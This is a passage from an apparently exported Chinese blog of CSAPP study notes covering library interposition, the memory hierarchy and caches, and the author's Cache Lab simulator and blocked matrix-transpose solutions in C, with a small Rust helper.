`__real_f` 的引用解析为对 `f` 的引用（用于调用真实函数），于是我们有：\n\n![](http://pic.caiwen.work/i/2025/08/12/689ae2eeb389e.png)\n\n编译：`gcc -DLINKTIME -c mymalloc.c` ，`gcc -c int.c`\n\n链接：`gcc -Wl,--wrap,malloc -Wl,--wrap,free -o intc int.o mymalloc.o`\n\n其中 `-Wl,option` 用于将 `option` 传递给链接器，并且 `option` 中的每个逗号都被替换成空格。\n\n### 运行时打桩\n\n有一个全局变量 `LD_PRELOAD`，程序在加载共享库时，动态链接器会先从 `LD_PRELOAD` 中寻找对应的共享库。我们把要拦截的函数写成一个共享库之后，把路径添加到 `LD_PRELOAD` 中就可以实现打桩。\n\n## 相关工具\n\n- `ar`：创建静态库，插入、删除、列出、提取成员。\n- `strings`：列出一个目标文件中所有可打印的字符串。\n- `strip`：从目标文件中删除符号表信息。\n- `nm`：列出一个目标文件的符号表中定义的符号。\n- `size`：列出目标文件中节的名字和大小。\n- `readelf`：显示一个目标文件的完整结构，包括 ELF 头中编码的所有信息。包含 `size` 和 `nm` 的功能。\n- `objdump`：显示目标文件的所有信息，主要用于反编译 `.text` 的指令\n- `ldd`：列出可执行文件在运行时需要的共享库\n\n","summary":"本文介绍了编译器驱动程序的工作流程，包括预处理、编译、汇编和链接步骤，详细解释了目标文件的类型（可重定位、可执行和共享目标文件）及其结构，并讨论了静态链接与动态链接机制、符号解析、重定位过程以及库打桩技术。","key":["csapp","链接","重定位","符号解析","静态库","共享库"],"tags":[],"path":["os","csapp","CSAPP第七章 - 链接.md"],"background":"http://pic.caiwen.work/i/2025/09/05/68baf82296e6f.png","recommend":false,"status":"published"},{"type":"Article","title":"CSAPP第六章 - 存储器层次结构","id":"csapp-6","createTime":"2025-08-05T07:18:00.000Z","updateTime":"2025-09-05T14:54:04.439Z","content":"\n\n\n\n\n## 存储技术\n\n### 随机访问存储器\n\n#### SRAM\n\nSRAM 是静态的随机访问寄存器，速度比 DRAM 快，常用作 CPU 内的缓存。\n\nSRAM 将每个位存储在一个双稳态的存储器中，每个存储单元是用一个六晶体管电路来实现。这个存储器的结构类似于一个倒转的钟摆，可以无限期地保持在两种电压状态之一，其他的所有状态都是不稳定的，并可以立刻由不稳定状态转移到稳定状态：\n\n![](http://pic.caiwen.work/i/2025/08/07/689403975cff0.png)\n\n原则上，钟摆还可以在垂直位置一直保持平衡。但是这个状态是亚稳态的，一旦有任何细微的扰动也会使钟摆倒下，而且一旦倒下就不会恢复到垂直状态。\n\nSRAM 这个双稳态的特性使得其只要有电，就能一直保持他的值，并且抗干扰的能力很强。干扰结束之后就能立刻恢复到原来的值。\n\n#### DRAM\n\nDRAM 将每个位存储为对一个非常小的电容的充电，每个存储单元由一个电容和一个访问晶体管组成。DRAM 存储单元对干扰非常敏感，电容的电压被扰乱之后就永远不会恢复了。\n\nDRAM 上的电容会漏电，每 10 到 100 毫秒就会丢失电荷，使得数据丢失。不过 CPU 的时钟周期是以纳秒来衡量的，所以 DRAM 的数据保持时间相对来说还是比较长。CPU 需要定期读出数据，并重写来刷新内存中的每一位。\n\n一个 DRAM 可以被分成 $d$ 个超单元。每个超单元可以存储 $w$ 位的信息。因此一个 DRAM 的存储 $dw$ 位。为了节省寻址电路，超单元是二维排列的，排列成 $r$ 行 $c$ 列的长方形，$rc=d$。每个超单元都可以用一个坐标 $(i,j)$ 进行定位。\n\n![](http://pic.caiwen.work/i/2025/08/07/6894075bdb427.png)\n\n每个 DRAM 芯片都连接有一个内存控制器，每次可以从 DRAM 写入或者读出一个超单元。\n\n对于 $(i,j)$ 位置的超单元操作时，内存控制器会首先将行地址 $i$ 通过 addr 电路发送到 DRAM 中（这一步称为 RAS 请求），DRAM 将会将 $i$ 行的超单元全部复制到内部的行缓冲区中。随后，由通过相同的 addr 电路将列地址 $j$ 发送（这一步称为 CAS 请求），DRAM 将会从内部行缓冲区中将第 $j$ 个数据读出到 data 电路上，或是从 data 电路中写入。\n\naddr 的电路宽度只需要可以容纳行数和列数中较大的那个就可以了。所以 DRAM 的行数和列数应该尽可能接近以减小 addr 电路引脚数量的浪费。\n\n多个 DRAM 组合成我们熟悉的内存：\n\n![](http://pic.caiwen.work/i/2025/08/07/6894098ec281c.png)\n\n读写某个内存地址时，内存控制器将会把一个内存地址转成 DRAM 上的 $(i,j)$ 形式，并发送到每个 DRAM 芯片上。上面的内存中，每个超单元存储一个字节，内存由 8 个 DRAM 芯片组成，所以内存每次能同时读出 8 个字节。这可能也是一些体系结构（如 risc-v）要求内存对齐的原因。\n\n上面这是传统的 DRAM。而实际应用中更多使用改进后的 DRAM ：\n\n- **FPM DRAM（快页模式 DRAM）**：传统的 DRAM 中，如果连续读写相同行的超单元，DRAM 会反复载入内部行缓冲区。FPM DRAM 则会识别到如果某一行已经载入到内部行缓冲区中则不再重新载入。\n- **EDO DRAM（扩展数据输出 DRAM）**：FPM DRAM 的加强版，允许 CAS 信号在时间上靠得更近一点。\n- **SDRAM（同步 DRAM）**：DRAM、FPM DRAM、EDO RAM 都是异步的，也就是他们的控制信号和内存控制器的时钟信号的频率无关。而 SDRAM 是同步的，使用与内存控制器时钟信号的上升沿来代替许多的控制信号。具体细节不深入探讨。这样带来的效果是 SDRAM 比上面三种更快。\n- **DDR SDRAM（双倍数据速率同步 DRAM）**：是 SDRAM 的增强版，他使用两个时钟沿作为控制信号，使得 DRAM 的速度翻倍。\n- **VRAM（视频 RAM）**：用在图形系统的帧缓冲区中。他基本思想和 FPM DRAM 类似，但有两个主要区别：首先是 VRAM 的输出是通过依次对内部缓冲区的整个内容进行移位得到的；其次是 VRAM 允许对内存进行并行读和写，这使得系统可以在写 VRAM 的同时，用 VRAM 中的数据更新屏幕。\n\n#### ROM\n\nSRAM 和 DRAM 都属于易失性存储器，在断电后就会失去存储的信息。ROM 是非易失性存储器，断电后数据仍保持。非易失性存储器既可以读又可以写，但是由于历史原因，习惯被称为只读存储器，即 ROM。ROM 有如下几类：\n\n- **PROM（可编程 ROM）** 每个存储器单元都一种熔丝，可被高电流熔断。PROM 只能被编程一次。\n- **EPROM（可擦写可编程 ROM）** 每个存储单元有一个透明的石英窗口，允许光到达存储单元，当紫外线光照射窗口时，存储单元数据就被清零。写入存储单元需要额外的特殊设备。EPROM 擦除和重编程次数的数量级可达到 1000 次。\n- **EEPROM（电子可擦除 ROM）** 类似 EPROM ，但不需要额外的设备进行写入，可以直接在 EEPROM 的电路卡上进行编程。EEPROM 能够被编程的次数的数量级可以达到 $10^5$ 次。现在的经常使用的闪存就是基于 EEPROM\n\n### 磁盘\n\n磁盘的结构如下：\n\n- 一个磁盘有若干个**盘片**。\n\n- 每个盘片有两面，称为**表面**。\n\n- 每个面上划分若干个同心圆，称为**磁道**。\n\n- 每个磁道被划分为一组**扇区**，每个扇区存储相等数量的数据（通常是 512 字节）。\n\n- 扇区之间由一些**间隙**分隔开，这些间隙中不存储数据位，而是用来标识扇区的格式化位。\n\n- 术语**柱面**指的是所有盘片表面上到主轴中心的距离相等的磁道集合。\n\n![](http://pic.caiwen.work/i/2025/08/07/68941482e7741.png)\n\n磁盘容量由如下因素决定：\n\n- **记录密度**：磁道一英寸的段中可以放入的位数\n- **磁道密度**：从盘片中心出发沿半径方向上，一英寸的段内可以有的磁道数\n\n我们定义面密度为记录密度和磁道密度的乘积。\n\n在之前，每个磁道上拥有的扇区数量都相同。但是由于磁道从内到外半径依次增大，这使得越外侧的磁道上扇区之间的间隙越来越大，会造成很严重的浪费。\n\n现代大容量磁盘使用了一种称为多区记录的技术。我们把一些连续的磁道划分成一个区，同一个区内磁道上的扇区数量一致，由最靠近中心的磁道的扇区数量一致。不同区的磁道的扇区数量不一致。所以现代磁盘的一个参数是平均扇区数。\n\n在磁盘上进行数据读写是以扇区为单位的。读写时会先寻找到目标地址所对应的扇区，有如下过程：磁盘上的读写头移动到目标扇区所在的磁道上，然后整个磁盘进行旋转，直到目标扇区到达读写头下。对于有多个盘片的磁盘，每个盘面都有一个读写头，读写头垂直排列，一致行动，很像内存同时读若干个 DRAM 芯片一样。\n\n![](http://pic.caiwen.work/i/2025/08/07/6894189c344d1.png)\n\n由于读写头距离盘面的高度只有 0.1 微米。因此哪怕是一粒微小的灰尘都会撞击到读写头。所以磁盘总是密封的。\n\n磁盘读写扇区的时间由如下组成：\n\n- 寻道时间：读写头移动到目标扇区所在的磁道的时间。现代磁盘的平均寻道时间是通过多次对随机扇区进行寻道，并统计耗时的平均值得到的，一般为 $3\\sim 9\\text{ms}$。一次寻道的最大时间可达到 $20\\text{ms}$。\n- 旋转时间：旋转盘片使得目标扇区到达读写头下的时间（准确来说是读写头到达目标扇区开头的时间）。由于盘片总是沿一个方向旋转，所以最坏情况下，读写头正好错过了目标扇区，需要整个旋转一圈，最大旋转时间根据磁盘的 RPM（每分钟旋转的圈数）计算。平均旋转时间是最大旋转时间的一半\n- 传送时间：读写头读取一个扇区的时间。可根据 RPM 和磁道上的扇区数来进行计算\n\n其中的传送时间很小，可以忽略不记。平均寻道时间一般作为磁盘的参数由制造商公布。旋转时间和平均寻道时间近似。因此将平均寻道时间乘 2 可以用来估计磁盘访问的时间。\n\n### 固态硬盘\n\n固态硬盘基于闪存技术。一个固态硬盘由闪存翻译层和闪存两部分组成。\n\n其中闪存由若干个块组成，每个块又由若干个页组成。一个页的大小大概是 512 字节到 4KB 之间。一个块由 $32\\sim 128$ 个页组成。\n\n数据以页为单位进行读写。写入时，需要把一个块进行擦除才能写这个块内的页。一个块大约进行 $10^5$ 次擦写后就会被损坏。一个块被损坏之后就不能用了。当写操作试图修改一个已经包含数据的页时，这个页所属的块，整个都需要先复制到另一个已经被擦除的块中，然后再对目标页进行写。这也就使得固态硬盘的随机写速度很慢。闪存翻译层中实现了很复杂的逻辑，尽可能最小化写的代价，但是写的速度还是没读的速度快。\n\n![](http://pic.caiwen.work/i/2025/08/07/68941d82ca4bd.png)\n\n## CPU 总线\n\nCPU 通过总线与外部的设备进行交互。总线结构如下：\n\n![](http://pic.caiwen.work/i/2025/08/07/689449a2df047.png)\n\n在读内存时，CPU 会将目标地址放到系统总线上，IO 桥将信号传递到内存总线，主存受到信号之后进行读取并将数据放到内存总线，IO 桥再将数据传回系统总线。写内存时同理。系统总线和内存总线与 CPU 相关。\n\n其他的，如鼠标键盘、显卡、磁盘等，是连接到 IO 总线上的。IO 总线与 CPU 无关。IO 总线要比内存总线慢很多。\n\nCPU 使用内存映射 IO 的技术来向 IO 设备发送命令。地址空间中有一块地址是用来与 IO 设备进行通信的，这被称为 IO 端口。一个设备可能会与一个或者多个 IO 端口相关联。\n\nCPU 在操作 IO 设备时（如读磁盘），会向 IO 接口发送指令，表明要进行的操作、操作目标、参数等，IO 总线不会将对应的内存操作发送到内存总线，而是转而发送到相应的 IO 设备上。由于 IO 设备执行速度相比 CPU 的时钟周期来说相当慢，所以发完指令之后 CPU 继续做其他事情。IO 设备进行完操作之后会自行把数据放到内存中而并不需要 CPU 干涉（这也被称为 DMA（直接内存访问）技术）。数据完全准备完毕之后则会给 CPU 发送一个中断信号。\n\n![](http://pic.caiwen.work/i/2025/08/07/68944d15b89a5.png)\n\n## 缓存\n\n### 存储器层次结构的缓存\n\n存储器的层次结构如下：\n\n![](http://pic.caiwen.work/i/2025/08/07/6894235e81679.png)\n\n一般而言，上层的存储作为下层存储的缓存。\n\n缓存既可以对数据进行缓存，又可以对指令进行缓存。前者称为 d-cache ，后者称为 i-cache。即缓存数据又缓存指令的缓存称为统一缓存。\n\n![](http://pic.caiwen.work/i/2025/08/07/6894386edbf43.png)\n\n如果访问第 $k+1$ 层数据的时候，第 $k$ 层已经有了，那么可以直接从第 $k$ 层获取，这成为**缓存命中**。\n\n反之我们称为**缓存不命中**，缓存不命中又分为如下的类型：\n\n- 如果第 $k$ 层是空的，那么任何的数据访问请求都会缓存不命中。我们称这样的第 $k$ 层为**冷缓存**，这样的缓存不命中称为**强制不命中**或是**冷不命中**\n- 第 $k$ 层决定缓存数据时，必须选择一个缓存的放置策略。最好的放置策略是第 $k$ 层的任何地方都可以放置缓存，但是这样的策略过于灵活，不好实现，且缓存定位起来代价也较高。硬件缓存一般使用的是比较严格的放置策略，第 $k+1$ 层的块 $i$ 在第 $k$ 层放置的位置取决于块编号 $i$。将一个块载入缓存时，如果放置的位置已经存在了数据，那么就会把原来被缓存的数据**驱逐**。这样会出现一个问题，就是可能 $k+1$ 层存在两个块使用了 $k$ 层的同一个位置。反复读取这两个块就会使得缓存一直不命中。这种缓存不命中称为**冲突不命中**\n- 程序在运行过程中，可能会反复使用某个数据（比如循环反复访问一个数组），这个数据称为这个阶段的**工作集**，当工作集的大小超过缓存的大小时，会出现缓存不命中，这种被称为**容量不命中**\n\n上面主要是关注读取。写入数据时，会出现两种情况：\n\n- 要写入的位置已经位于缓存中，我们称之为**写命中**，此时又有两种策略：\n  - **直写**：修改位于缓存中的块，然后立刻把这个块写回低一层。优点是简单，缺点是每次写都会引起总线的流量。\n  - **写回**：修改位于缓存中的块，但是不立刻写回到低一层，而是等该缓存被驱逐时，才会写回到低一层。优点是可以减少总线的流量，缺点是增加了复杂性，需要额外维护缓存是否被修改过\n- 要写入的位置没有在缓存中，即**写不命中**，此时也有两种策略：\n  - **写分配**：把要写入的位置加载到缓存中，再进行修改。写分配通常和写回配合。\n  - **非写分配**：避开缓存，直接修改低一层。非写分配通常和直写配合\n\n一般写回+写分配策略是比较常用的。因为对低一层的存储器进行写消耗的时间比较大，且写回+写分配与处理读的方式更加统一，且写回+写分配导致的电路复杂性在现代电路中已经不算障碍了。\n\n### 缓存结构\n\n假设一个计算机系统每个存储器地址有 $m$ 位，形成 $M=2^m$ 个不同的地址。\n\n一个缓存有 $S=2^s$ 个缓存组。\n\n每个缓存组有 $E$ 个缓存行。\n\n每个缓存行包含三部分：有效位、标记、$B=2^b$ 个缓存块。\n\n![](http://pic.caiwen.work/i/2025/08/07/68943b631c56e.png)\n\n从缓存中读一个地址的时候，我们把这个地址分成三部分。其中 $s$ 和 $b$ 是缓存的参数，$t=m-s-b$\n\n![](http://pic.caiwen.work/i/2025/08/07/68943be38bd56.png)\n\n根据取到的组索引选择相应的缓存组，然后在该组内的缓存行中搜索，找到有效位为 1 且标记部分和地址的标记部分相同的缓存行。找到了则说明缓存命中，并根据块偏移读取缓存行中相应的块。反之说明缓存不命中，从下一层存储器读取数据并载入缓存。从下一层存储器读取数据时，不光要读取要访问的块，还需要把其对应的缓存行中其他的缓存块也读入，这样下次读入上次地址附近的数据时缓存就命中了。\n\n#### 直接映射缓存\n\n当 $E=1$ 即每个缓存组只有一个缓存行时，我们将这种缓存称为直接映射缓存。\n\n![](http://pic.caiwen.work/i/2025/08/07/6894409ac44ee.png)\n\n这种缓存容易产生冲突不命中。如：\n\n![](http://pic.caiwen.work/i/2025/08/07/68943e54e0a33.png)\n\n假设缓存只有两个缓存组，一个缓存行有 16 个块（存放 16 个字节，即可以存放 4 个单精度浮点数）。如果上述函数的 x 和 y 在内存中连续放置的话，则有：\n\n![](http://pic.caiwen.work/i/2025/08/07/68943f2b1ecaf.png)\n\n于是就会发现第七行代码会使得缓存不断发生冲突不命中。我们称程序在 x 和 y 之间进行抖动。抖动可能会使程序运行速度下降 2 或 3 倍。一个简单的解决方法是在 x 后面填充一些数据，填充大小与一个缓存行的所有块大小一致。比如我们定义为 `float x[12]`，就有：\n\n![](http://pic.caiwen.work/i/2025/08/07/68944037a0f74.png)\n\n这样就不会发生抖动了\n\n#### 全相连缓存\n\n缓存只有一个缓存组，称为全相连缓存：\n\n![](http://pic.caiwen.work/i/2025/08/07/689440e579c11.png)\n\n缓存在硬件实现上，是并行地判断缓存行的标记和地址上的标记是否匹配。全相连缓存的缓存行非常多，这会使得标记匹配的电路的实现又贵又困难。全相连缓存只适合做小的缓存，如虚拟内存的快表（TLB）就是全相连缓存。\n\n#### 组相连缓存\n\n除了上面两种情况的缓存就是组相连缓存。有 $E$ 个缓存组的缓存被称为 $E$ 路组相联缓存。\n\n![](http://pic.caiwen.work/i/2025/08/07/689442a00c550.png)\n\n像组相联缓存和全相连缓存，一个缓存组内有多个缓存行这种，在缓存不命中的时候，如果存在有效位为 0 的缓存行，我们就可以把新载入的数据放到这个缓存行中。如果没有的话，我们需要选择驱逐哪个缓存行，需要确定一个替换策略。替换策略有两种：\n\n- **LFU（最不常使用策略）**：替换在过去某个时间窗口内引用次数最少的缓存行\n- **LRU（最近最少使用策略）**：替换最后一次访问时间最久远的缓存行\n\n### 缓存性能\n\n有如下指标来衡量缓存的性能：\n\n- 不命中率：$\\frac{\\text{不命中数量}}{\\text{引用数量}}$\n- 命中率：$1-\\text{不命中率}$\n- 命中时间：从缓存传送一个字到 CPU 所需要的时间，包含组选择、行确认、字选择、字传送的时间\n- 不命中处罚：由于不命中所需要的额外时间，包含从下一层存储读数据、进行替换等时间\n\n对于缓存大小，一方面，较大缓存大小可以提高缓存命中率。另一方面，大存储器的命中时间会长一点。因此层次越高的存储器大小越小。\n\n对于单个缓存行的块数量，一方面，较多的块数量可以提高命中率。另一方面，也会增加不命中处罚。\n\n对于相连度（即单个缓存组中缓存行的数量大小），一方面，相连度较大的话可以降低冲突不命中的抖动。另一方面，较高的相连度实现起来复杂又昂贵，这会增加命中时间，且选择被替换的行的复杂性也增加了，这会增加不命中时间。一般层次越高的缓存使用较低的相连度，层次较低的缓存使用较高的相连度。\n\n## 程序利用缓存\n\n一个良好的程序应当具有良好的局部性。局部性有两种形式：\n\n- 空间局部性：如果一个内存位置被引用了一次，那么程序在不远的将来会引用这个内存位置附近的内存位置（这个内存位置被引用后必然存在缓存中，那么其附近的数据可能在同一个缓存行中）\n- 时间局部性：某个内存位置被引用之后，后续还可能会多次引用这个内存位置（这个内存位置已经被载入缓存）\n\n### 时间局部性\n\n下表展示了时间局部性：\n\n![](http://pic.caiwen.work/i/2025/08/07/689453adc8ff4.png)\n\n这表明，工作集越小，越能够放进更高层的缓存中，使得访问速度更快。我们应该考虑将访问频繁的数据放入 L1 缓存中。\n\n步长为 1 进行访问时，即使访问的工作集已经远远超过 L1 缓存大小，但是测试会发现仍可以获得 L1 缓存的访问速率。这是因为现代的处理器有硬件级的预取机制，能够自动识别步长为 1 的访问模式，进而在下一次访问开始之前就把数据加入到缓存中。\n\n### 空间局部性\n\n下表展示了空间局部性：\n\n![](http://pic.caiwen.work/i/2025/08/07/689455bf8ff2c.png)\n\n吞吐量的降低是由于缓存不命中次数的增加。步长从 8 开始，每次访问都会导致缓存不命中，读吞吐量退化到和直接读取较低层存储器一样了。我们应该考虑尽可能让访问比较连续，以增加空间局部性。\n\n如：\n\n![](http://pic.caiwen.work/i/2025/08/07/6894500008761.png)\n\n第三章学习过，多维数组在内存中的放置是按最后一个下标连续放置的，所以上面的代码会连续访问内存，代码有很好的空间局部性。但是没有很好的时间局部性，因为每个地址只会被访问一次。一般空间局部性和时间局部性有一个就可以。\n\n其缓存命中情况如下：\n\n![](http://pic.caiwen.work/i/2025/08/07/6894508c60b5d.png)\n\n而如果我们交换循环顺序：\n\n![](http://pic.caiwen.work/i/2025/08/07/689450ac6dacf.png)\n\n代码会跳跃式地访问内存，空间局部性变得很差。缓存命中情况也很糟糕：\n\n![](http://pic.caiwen.work/i/2025/08/07/689450ffee4b8.png)\n\n在一些机器上，前者会比后者快 25 倍。\n\n## Cache Lab\n\n### Part A\n\n第一部分要求我们手动实现一个缓存的模拟器，还是比较简单的：\n\n```c\n#include \"cachelab.h\"\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\ntypedef unsigned long long u64;\n\ntypedef struct {\n    int valid, last_time;\n    u64 tag;\n} CacheRow;\n\ntypedef struct {\n    CacheRow *rows;\n} CacheGroup;\n\nint s, E, b, time_stamp, group_cnt, hit_cnt, miss_cnt, eviction_cnt;\nchar *file_name;\nCacheGroup *groups;\n\nint str2int(char *str) {\n    int len = strlen(str);\n    int res = 0;\n    for (int i = 0; i < len; i ++){\n        res *= 10;\n        res += str[i] - '0';\n    }\n    return res;\n}\n// int hex2int(char *str) {\n//     int len = strlen(str);\n//     int res = 0;\n//     for (int i = 0; i < len; i ++) {\n//         res *= 16;\n\n//     }\n//     return res;\n// }\nvoid parseArguments(int argc, char* argv[]) {\n    for (int i = 1; i < argc; i += 2) {\n        if (argv[i][1] == 't') {\n            file_name = argv[i + 1];\n        } else {\n            int val = str2int(argv[i + 1]);\n            switch (argv[i][1]) {\n                case 's':\n                    s = val;\n                    break;\n                case 'E':\n                    E = val;\n                    break;\n                case 'b':\n                    b = val;\n                    break;\n            }\n        }\n    }\n    group_cnt = 1 << s;\n}\nvoid initCache() {\n    groups = malloc(sizeof(CacheGroup) * group_cnt);\n    for (int i = 0; i < group_cnt; i ++) {\n        CacheRow *rows = malloc(sizeof(CacheRow) * E);\n        for (int j = 0; j < E; j ++) {\n            rows[j].valid = 0;\n        }\n        groups[i].rows = rows;\n    }\n}\nvoid touchCache(u64 group_index, u64 tag) {\n    time_stamp ++;\n    CacheRow *rows = groups[group_index].rows;\n    for (int i = 0; i < E; i ++) {\n        if (rows[i].valid && rows[i].tag == tag) {\n            hit_cnt ++;\n            rows[i].last_time = time_stamp;\n            return;\n        }\n    }\n    miss_cnt ++;\n    for (int i = 0; i < E; i ++) {\n        if (!rows[i].valid) {\n            rows[i].valid = 1;\n            rows[i].tag = tag;\n            rows[i].last_time = time_stamp;\n            return;\n        }\n    }\n    eviction_cnt ++;\n    int eviction_target = 0;\n    for (int i = 1; i < E; i ++) {\n        if (rows[i].last_time < rows[eviction_target].last_time) {\n            eviction_target = i;\n        }\n    }\n    rows[eviction_target].tag = tag;\n    rows[eviction_target].last_time = time_stamp;\n}\nvoid readTrace() {\n    FILE *file = fopen(file_name, \"r\");\n    char line[256];\n    while (fgets(line, sizeof(line), file)) {\n        if (line[0] == 'I') continue;\n        int len = strlen(line);\n        char op = line[1];\n        u64 addr = 0;\n        for (int i = 3; i < len; i ++) {\n            if (line[i] == ',') break;\n            addr *= 16;\n            if (line[i] <= '9') addr += line[i] - '0';\n            else addr += line[i] - 'a' + 10;\n        }\n        //u64 block_index = addr & (((u64)1 << b) - 1);\n        u64 group_index = (addr >> b) & (((u64)1 << s) - 1);\n        u64 tag = addr >> (b + s);\n        if (op == 'L' || op == 'S') touchCache(group_index, tag);\n        else if (op == 'M') touchCache(group_index, tag), touchCache(group_index, tag);\n    }\n}\nint main(int argc, char* argv[])\n{\n    parseArguments(argc, argv);\n    initCache();\n    readTrace();\n    printSummary(hit_cnt, miss_cnt, eviction_cnt);\n    return 0;\n}\n\n```\n\n### Part B\n\n这一部分要求我们去优化一个矩阵转置函数，使其缓存的不命中次数尽可能少。输入的矩阵大小只有 $32\\times 32$ 、$64\\times 64$、$61\\times 67$ 三种，允许我们针对这三种特定情况进行优化。\n\n为了方便观察内存地址的访问情况，我写了个 rust 程序，可以将 trace 中每个地址的标记、组索引、块偏移计算出来：\n\n```rust\nuse std::io::BufRead;\n\nfn main() {\n    let mut lines = vec![];\n    let mut max_line_len = 0;\n    for line in std::io::stdin().lock().lines() {\n        let line = line.unwrap();\n        if !line.starts_with('L') && !line.contains('S') {\n            continue;\n        }\n        max_line_len = max_line_len.max(line.len());\n        lines.push(line);\n    }\n    max_line_len += 2;\n    for line in lines {\n        let part: u64 = line\n            .split_ascii_whitespace()\n            .filter(|s| s.len() >= 2)\n            .collect::<Vec<_>>()\n            .join(\"\")\n            .split(',')\n            .next()\n            .unwrap()\n            .chars()\n            .map(|c| c.to_digit(16).unwrap() as u64)\n            .fold(0u64, |acc, d| acc * 16 + d) as u64;\n        let block_index = part & ((1 << 5) - 1);\n        let group_index = (part >> 5) & ((1 << 5) - 1);\n        let tag = part >> 10;\n        println!(\"{}{}{:015b} {:05b} {:05b}\\ttag={},group={}\", line, \" \".repeat(max_line_len - line.len()), tag, group_index, block_index, tag, group_index);\n    }\n}\n```\n\n然后我们可以这么运行：\n\n```bash\nmake\n./test-trans -N 32 -M 32\n./csim-ref -v -s 5 -E 1 -b 5 -t trace.f1 | cargo run > trace_fmt\n```\n\n然后在 `trace_fmt` 文件中就可以看到相应的信息了：\n\n![](http://pic.caiwen.work/i/2025/08/05/6891b2300eafb.png)\n\n#### 32 x 32\n\n上图展示了最朴素的转置函数的缓存命中情况。从第六行开始应该是和转置函数有关。其中 `L` 开头的应该是访问数组 `A`，`S` 开头的应该是访问数组 `B`。我们发现后者基本从来没命中过缓存，而前者缓存命中率很高。\n\n```cpp\n/*\n * trans - A simple baseline transpose function, not optimized for the cache.\n */\nchar trans_desc[] = \"Simple row-wise scan transpose\";\nvoid trans(int M, int N, int A[N][M], int B[M][N])\n{\n    int i, j, tmp;\n\n    for (i = 0; i < N; i++) {\n        for (j = 0; j < M; j++) {\n            tmp = A[i][j];\n            B[j][i] = tmp;\n        }\n    }\n\n}\n```\n\n原因也很明显，对 `A` 的访问是连续的，但是由于对 `B` 的访问是跳行的，所以 `B` 一次的访问根本用不到上次的访问时加载的缓存。\n\n实验的文档中给了个提示，说是分块技术可能对实验有帮助。我没仔细看，只是大概了解了一下分块的思想，并想到了优化方案。由于缓存的块偏移有 $b=5$ 位，int 大小为 4 字节，所以每个缓存行可以缓存 $\\frac{2^5}{4} = 8$ 个元素。我们按 $8\\times8$ 的分块大小将 $32\\times 32$ 的矩阵划分成 $4\\times 4$ 部分。对于一个块的全部元素进行置换，被置换的元素仍在 `B` 中的某个块中。\n\n对于一个块，我们先把他一行的全部元素进行读取，存到变量中。然后我们再按列方向，把置换后的元素写入 `B` 的对应位置，由于是按列，缓存可能全没有命中（比如第一次时），但是此时 `B` 的块中的每一行都被载入缓存了。然后我们再从 `A` 中读取下一行，因为缓存仍未命中，于是将这一行加入缓存（假设加入了缓存组 $x$），然后再把这一行元素全部读取到变量。接下来在 `B` 中按列方向进行写入时，由于上一次已经把 `B` 的块中的每一行载入缓存了，所以大部分的缓存都是命中的，唯独缓存组 $x$ 对应的那个行，被 `A` 中元素覆盖了，未命中缓存。这样一来，我们的缓存命中次数会很高。\n\n```c\n/*\n * transpose_submit - This is the solution transpose function that you\n *     will be graded on for Part B of the assignment. Do not change\n *     the description string \"Transpose submission\", as the driver\n *     searches for that string to identify the transpose function to\n *     be graded.\n */\nchar transpose_submit_desc[] = \"Transpose submission\";\nvoid transpose_submit(int M, int N, int A[N][M], int B[M][N])\n{\n    int col, row, p, e1, e2, e3, e4, e5, e6, e7, e8;\n\n    for (row = 0; row < N; row += 8) {\n        for (col = 0; col < M; col += 8) {\n            for (p = 0; p < 8; p ++) {\n                e1 = A[row + p][col];\n                e2 = A[row + p][col + 1];\n                e3 = A[row + p][col + 2];\n                e4 = A[row + p][col + 3];\n                e5 = A[row + p][col + 4];\n                e6 = A[row + p][col + 5];\n                e7 = A[row + p][col + 6];\n                e8 = A[row + p][col + 7];\n                B[col][row + p] = e1;\n                B[col + 1][row + p] = e2;\n                B[col + 2][row + p] = e3;\n                B[col + 3][row + p] = e4;\n                B[col + 4][row + p] = e5;\n                B[col + 5][row + p] = e6;\n                B[col + 6][row + p] = e7;\n                B[col + 7][row + p] = e8;\n            }\n        }\n    }\n}\n```\n\n测试的 misses 只有 288\n\n#### 64 x 64\n\n当矩阵大小为 $64\\times 64$ 时，上面的优化方案竟然和朴素做法相差不大。\n\n实际上，$32\\times 32$ 时，每个元素会存放到的缓存组分布如下：\n\n```\n5  6  7  8\n9  10 11 12\n13 14 15 16\n17 18 19 20\n21 22 23 24\n25 26 27 28\n29 30 31 0\n1  2  3  4\n```\n\n其中每行代表一个元素，每列代表 8 个元素。\n\n而 $64\\times 64$ 时，则为：\n\n```\n5  6  7  8  9  10 11 12\n13 14 15 16 17 18 19 20\n21 22 23 24 25 26 27 28\n29 30 31 0  1  2  3  4\n5  6  7  8  9  10 11 12\n13 14 15 16 17 18 19 20\n21 22 23 24 25 26 27 28\n29 30 31 0  1  2  3  4\n```\n\n前者 $8\\times 8$ 的一个块中，列方向有 $8$ 个不同的缓存组。而后者只有 $4$ 个不同的缓存组。在按列方向写 `B` 时，后 4 行会因为与前 4 行共用了一个缓存组，导致缓存命中率很低（甚至根本无法命中）\n\n一个方案是我们改成 $4\\times 4$ 分块。但是这样做 misses 还是有 1700，无法获得满分\n\n我们在列方向上最多只能反复写 $4$ 行，不然缓存就会不断地载入又被驱逐\n\n所以一个想法是使用 $8\\times 4$ 的分块，这样做 misses 有 1600 多。随后我加了一点优化：\n\n![](http://pic.caiwen.work/i/2025/08/06/68932d7852690.png)\n\n我们按绿色箭头的方向进行读取，而不是一律从上到下进行读取。因为读完最后一个的时候，整个行上的 $8$ 个元素都载入到缓存了，这样做可以增大缓存的利用率。\n\n同时，我考虑每次读两行，这样可能能够减少缓存不命中。于是有了如下代码：\n\n```c\nfor (row = 0; row < N; row += 8) {\n    now = 0;\n    for (col = 0; col < row; col += 4) {\n        for (now? (p = 8 - 1) : (p = 0); now? (p >= 0) : (p < 8); now? (p -= 2) : (p += 2)) {\n            e1 = A[row + p][col];\n            e2 = A[row + p][col + 1];\n            e3 = A[row + p][col + 2];\n            e4 = A[row + p][col + 3];\n            e5 = A[row + p + (now? -1:1)][col];\n            e6 = A[row + p + (now? -1:1)][col + 1];\n            e7 = A[row + p + (now? -1:1)][col + 2];\n            e8 = A[row + p + (now? -1:1)][col + 3];\n            B[col][row + p] = e1;\n            B[col + 1][row + p] = e2;\n            B[col + 2][row + p] = e3;\n            B[col + 3][row + p] = e4;\n            B[col][row + p + (now? -1:1)] = e5;\n            B[col + 1][row + p + (now? -1:1)] = e6;\n            B[col + 2][row + p + (now? -1:1)] = e7;\n            B[col + 3][row + p + (now? -1:1)] = e8;\n        }\n        now = 1 - now;\n    }\n}\n```\n\n这样做的 misses 